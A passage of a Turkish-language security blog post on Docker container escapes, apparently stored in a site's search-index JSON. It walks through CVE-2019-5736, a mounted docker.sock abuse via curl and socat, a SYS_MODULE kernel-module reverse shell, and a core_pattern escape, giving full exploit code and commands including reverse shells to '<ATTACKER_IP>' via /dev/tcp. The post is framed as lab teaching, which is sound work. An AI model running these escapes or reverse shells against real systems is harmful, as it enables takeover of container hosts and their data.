yardımcı olur.İki yaygın LSM örneği şunlardır: AppArmor ve SELinux.\nAppArmor\nHem uygulama hem de işletim sistemi düzeyinde güvenlik politikalarını uygular. Profil kullanarak bu işlemleri gerçekleştirir. Documentation\rSELinux\nKullanıcıların, süreçlerin ve nesnelerin arasındaki erişimi daha ayrıntılı bir şekilde kontrol eder.\nNot\nDocker, enforcement modunda varsayılan bir Linux Security Module (LSM) profili etkinleştirir, bu da çoğunlukla bir konteynerın hassas /proc ve /sys girişlerine erişimini kısıtlamaya hizmet eder.\nBu profil aynı zamanda mount çağrısını da engeller.\n1.2 Docker Escape Nedir?\nDocker konteynerların kısıtlı izolasyon ortamından kaçarak (escape ederek) host sistemine erişim sağlamaya çalışan bir güvenlik açığı veya saldırı türünü ifade eder.\nDocker İçinde Olup Olmadığımızı Nasıl Anlarız?\ncat /proc/1/cgroup yazdığımızda içerisinde docker görürsek büyük ihtimalle docker içerisindeyizdir. Docker\u0026rsquo;a özgü işlemlere bakılabilir. Bundan sonra artık örnekler üzerinde anlatacağım.\n1.3 Engine Vulnerabilities RunC Ilerideki öğrenmek için bilmemiz gereken bir kaç terimi alt tarafta açıklayacağım.\nRunC Nedir?\nKonteynerleri çalıştırmaya yönelik görevleri ele almak üzere kullanılır - bir konteyner oluşturma, mevcut bir konteynere bir işlem bağlama (docker exec) ve benzeri işlemler.\n/proc Nedir?\nLinux işletim sistemlerinde kullanılan bir sanal dosya sistemidir. Bu sanal dosyalar, sistemde çalışan işlemlerin bilgilerinden, donanım kaynaklarının durumundan, ağ istatistiklerinden ve diğer çeşitli sistem bilgilerinden sorumlu olan çekirdek modülü tarafından düzenli olarak güncellenir.\n/proc/self Nedir?\nÇalışan process’in dizinine işaret eden sembolik bir bağlantıdır.\n/proc/self/exe Nedir?\nProcess’in çalıştırdığı yürütülebilir dosyaya işaret eden sembolik bir bağlantıdır.\n/proc/self/fd Nedir?\nProcess tarafından açılan dosya tanımlayıcılarını (file descriptors) içeren bir dizindir.\nfile descriptors: Bir sürecin açık dosyalar veya giriş/çıkış kaynaklarına olan erişimini belirtir. Dosya açma, okuma veya yazma gibi işlemler yapılabilir. CVE 2019-5736 Şimdi zafiyetin mantığına geçebiliriz\nExploit kodu çalıştığında, ilk olarak /bin/bash binary\u0026rsquo;sini #!/proc/self/exe ile değiştirir. Bu, eğer docker exec id bash komutu yazılırsa, runC konteynerine giriş yapacak ve bash\u0026rsquo;ı çalıştıracaktır. Ancak bash binary\u0026rsquo;si, #!/proc/self/exe olarak değiştirildiği için bu çalışan işlemin yürütülebilir dosyasını gösterdiğinden dolayı, exploit kodu gidip hostta runC\u0026rsquo;yi başlatacaktır.\nTam bu anda kodun devamında runC işleminin PID sini ve File Descriptor\u0026rsquo;u yakalayacaktır. Bu fd\u0026rsquo;ı da overwrite fonksiyonuna yolluyor. Bu fonksiyon ise runC binarysini değiştirip içine reverse shell ekleyecektir.\nBunları yaptıktan sonra konteyner içinde nc -lvnp 4444 gibi dinlemeye alırsak host tekrardan docker exec id herhangi-komut çalıştırdığında konteyner\u0026rsquo;a host shell\u0026rsquo;i gelmiş olacaktır.\n1.4 Weak Deployment Bu başlık altında kullanıcı tarafından oluşan zafiyetlere örnek vereceğiz.\nMounted Docker Socket Docker Socket: Docker konteyner’larda kullanıcı modu ve kernel modu arasında iletişimi sağlar.\nZafiyetli Makina: docker run -it -v /var/run/docker.sock:/var/run/docker.sock exposedsocket\nBuradaki sıkıntı host\u0026rsquo;un docker.sock dosyası konteyner içine eklenmiş yani konteyner içindekiler bu docker.sock u kullanarak docker ile etkileşime geçebilir.\nExploit Bu sıkıntıyı exploit etmek için curl ve socat tool\u0026rsquo;larını kullanacağız. Ilk olarak ls /var/run/ yazarak gerçekten docker.sock dosyası var mı yok mu bakalım.\nŞimdi bu exploitte amacımız kendi konteyner\u0026rsquo;ımızdan çıkıp kendimiz için yüksek yetkide başka konteyner açmak ve oraya geçmektir. Ilk olarak zafiyetli konteyner oluşturmak için bir json yazalım. Bu json ile yeni konteyner\u0026rsquo;ı oluşturacağız.\nBu alttaki makine \u0026ndash;privileged ile başlatılmış ve görüldüğü üzere host\u0026rsquo;un dosyaları konteyner içine eklenmiş. Aslında direkt bu makineye geçtiğimizde host dosyalarına erişebildiğimiz için direkt escape işlemini tamamlamış oluyoruz.\n{ \u0026#34;Image\u0026#34;: \u0026#34;ubuntu\u0026#34;, \u0026#34;Cmd\u0026#34;: [\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;apt update \u0026amp;\u0026amp; apt install -y python3 \u0026amp;\u0026amp; /bin/sh\u0026#34;], \u0026#34;DetachKeys\u0026#34;: \u0026#34;Ctrl-p,Ctrl-q\u0026#34;, \u0026#34;OpenStdin\u0026#34;: true, \u0026#34;HostConfig\u0026#34;: { \u0026#34;Privileged\u0026#34;: true, \u0026#34;PidMode\u0026#34;: \u0026#34;host\u0026#34;, \u0026#34;Mounts\u0026#34;: [ { \u0026#34;Type\u0026#34;: \u0026#34;bind\u0026#34;, \u0026#34;Source\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;Target\u0026#34;: \u0026#34;/host\u0026#34; } ] } } curl -XGET --unix-socket /var/run/docker.sock http://localhost/containers/json: Komutu ile hostta çalışan bütün konteyner\u0026rsquo;ları listeleyebiliyoruz. Burada \u0026ndash;unix-socket \u0026rsquo;e kullanmasını istediğimiz socket\u0026rsquo;i veriyoruz.\ncurl -XPOST -H \u0026quot;Content-Type: application/json\u0026quot; --unix-socket /var/run/docker.sock -d \u0026quot;$(cat container.json)\u0026quot; http://localhost/containers/create: Komutu ile üstte yazdığımız json\u0026rsquo;u kullanarak zafiyetli konteyner\u0026rsquo;ı oluşturuyoruz. Alttaki gibi bir çıktı alacaksınız. Burada ilk Id kısmı işimize yaracaktır.\nResponse {\u0026#34;Id\u0026#34;:\u0026#34;f9ca25e4e3e4d749029a0cb96e44166378dda1ddc4f890f22bb6c371800e523f\u0026#34;,\u0026#34;Warnings\u0026#34;:null} curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/\u0026lt;CID\u0026gt;/start: Komutu ile CID kısmına yukarıdaki Id nin ilk 4 karakterini yazarak oluşturduğumuz konteyner\u0026rsquo;ı çalıştırıyoruz.\nBütün bunları yaptıktan sonra zafiyetli çalışan bir konteyner\u0026rsquo;ımız var. Şimdi yapmamız gereken buna bağlanmak. Bunun için socat kullanacağız.\nsocat - UNIX-CONNECT:/var/run/docker.sock: Yazarak docker.sock a bağlanıyoruz. Bu bağlantının içinde alttaki http requestini yazarak kendimize TCP bağlantısı alıyoruz.\nPOST /containers/\u0026lt;CID\u0026gt;/attach?stream=1\u0026amp;stdin=1\u0026amp;stdout=1\u0026amp;stderr=1 HTTP/1.1 Host: Connection: Upgrade Upgrade: tcp Shell geldiğinde cd /host/home gidersek host\u0026rsquo;un dosyalarını bulabilirsiniz.\nExcessive Capabilities Bu örnekte bir konteyner\u0026rsquo;a aşırı yetenek eklendiğinde çıkan sorunlardan birini işleyeceğiz. Burada fazladan SYS_MODULE yeteneği eklenmiş ve bunun ne işe yaradığını üst tarafta anlattık.\nZafiyetli Makina: docker run -it –rm –cap-add SYS_MODULE sysmodule\nBuradaki sıkıntı yine dediğim gibi SYS_MODULE yeteneğinin konteyner\u0026rsquo;a eklenmiş olmasıdır.\nRequirements\nbuild-essential linux-headers-$(uname -r) net-tools netcat nano (optional) kmod Exploit\nBu exploit\u0026rsquo;i yaparken bize iki adet dosya lazım. Biri revshell.c diğeri de Makefile\nAltta revshell.c nin içeriğini görebilirsiniz\n#include\u0026lt;linux/init.h\u0026gt; #include\u0026lt;linux/module.h\u0026gt; #include\u0026lt;linux/kmod.h\u0026gt; MODULE_LICENSE(\u0026#34;GPL\u0026#34;); static int start_shell(void){ char *argv[] ={\u0026#34;/bin/bash\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;ATTACKER_IP\u0026gt;/4444 0\u0026gt;\u0026amp;1\u0026#34;, NULL}; static char *env[] = { \u0026#34;HOME=/\u0026#34;, \u0026#34;TERM=linux\u0026#34;, \u0026#34;PATH=/sbin:/bin:/usr/sbin:/usr/bin\u0026#34;, NULL }; return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC); } static int init_mod(void){ return start_shell(); } static void exit_mod(void){ return; } module_init(init_mod); module_exit(exit_mod); Bu da bizim makefile dosyamız olacaktır.\nobj-m +=revshell.o all: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules clean: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean Zafiyetli makineye girdiğimiz de ilk olarak kendi ip\u0026rsquo;mizi ifconfig ile alıp revshell.c nin içerisine atmaktır. Arından zafiyetli makinede başka bir shell alıp orada nc -lvnp 4444 ile dinlemeye başlamaktır.\nBundan sonra gidip ilk olarak make atacağız ki modülümüz derlensin. Arından insmod revshell.ko yazarak modülümüzü yüklüyoruz. Bunların hepsini doğru yapılırsa dinleme yaptığımız yere shell gelmiş olacaktır.\n1.5 Kernel Exploitation Core Pattern core_pattern: Linux işletim sistemi çekirdeğinde çökmelerde oluşan çekirdek döküm dosyalarının adını ve konumunu belirleyen bir sistem ayarıdır.\nBu zafiyet core_pattern dosyası sayeside vardır. Bu zafiyet için ya makinede privilege escalation yapmamız gerekiyor. Ya da düzgün apparmor\u0026rsquo;un kapalı olması gerekiyor\nRequirements\nnet-tools nano (optional) netcat kmod gcc Exploit\nZafiyetli Makina: docker run -it --rm --cap-add=SYS_ADMIN --secuity-opt apparmor:unconfined corepattern bash\nBurada ilk olarak crash.c diye bir c kodumuz olucak. Bu kodun tek amacı bize Segmantation Fault vermesi olucak. Bu kod sayesinde bizim core_pattern tetiklenecek.\nBirde shell.sh kodumuz olucak bu bildiğimiz basit bir reverse shell kodu. Alttaki gibidir.\n#!/bin/bash /bin/bash -c \u0026#34;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/IP/4444 0\u0026gt;\u0026amp;1\u0026#34; Son olarak escape.sh kodumuz olucak bu kod sayesinde kaçma işlemini yapacağız.\n#!/bin/bash overlay=`sed -n \u0026#39;s/overlay \\/ .*\\perdir=\\([^,]*\\).*/\\1/p\u0026#39; /etc/mtab` mkdir /newproc mount -t proc proc /newproc cd /newproc/sys/kernel echo \u0026#34;|$overlay/need/shell.sh\u0026#34; \u0026gt; core_pattern sleep 6 /crash Şimdi kodu anlatalım. Yukarıda anlattığımız overlay pathini ilk satırda alıyoruz. Bu path yardımı ile host\u0026rsquo;un bizim shell.sh dosyamızı çalıştırmasını sağlayacağız.\nHost\u0026rsquo;un proc\u0026rsquo;larını mount etmek için yeni klasör oluşturuyoruz ve oraya mount ediyoruz. Bu şekilde hostun proc dosyalarını konteyner içinde görebilir, değiştirebiliriz.\nBu dosyaların içinden /sys/kernel da bizim core_pattern dosyamız bulunmakta bu dosyanın içine echo \u0026quot;|$overlay/shell.sh\u0026quot; \u0026gt; core_pattern ile shell.sh dosyasının path\u0026rsquo;ini belirtiyoruz. Arından 6 saniye bekleyip /crash dosyasını çalıştırıyoruz.\n/crash dosyası Segmantation Fault hatası verince core_pattern dosyası okunuyor, okunurken bizim path\u0026rsquo;imi ve başıdaki | ı görüp o dosyayı çalıştırıyor. Bu da bize host\u0026rsquo;a bağlantı veriyor.\nTabiki escape.sh\u0026lsquo;ı çalıştırmadan önce nc -lvnp 4444 ile dinlemeye almalıyız.\nKaynakça Intro to Docker LAB\rKablosuz Kedi\rAll You Need Is Cap\rAll You Need Is Cap Video\rExcessive Capabilities\rUnderstanding Docker Escapes\rBest One\rLinux Capabilities\rRunC Check\rCVE-2019-5736\rRunc PoC\r","permalink":"http://localhost:1313/posts/docker-escape/","tags":["Docker","Capabilities","Linux","Security"],"title":"Docker Escape"},{"categories":null,"content":"","permalink":"http://localhost:1313/search/_index.es/","tags":null,"title":""},{"categories":null,"content":"","permalink":"http://localhost:1313/search/_index.fr/","tags":null,"title":""},{"categories":null,"content":"","permalink":"http://localhost:1313/search/_index.hi/","tags":null,"title":""},{"categories":null,"content":"","permalink":"http://localhost:1313/search/_index.jp/","tags":null,"title":""},{"categories":null,"content":"","permalink":"http://localhost:1313/search/_index.pl/","tags":null,"title":""},{"categories":null,"content":"","permalink":"http://localhost:1313/search/_index.ru/","tags":null,"title":""},{"categories":null,"content":"","permalink":"http://localhost:1313/search/_index.zh-cn/","tags":null,"title":""}]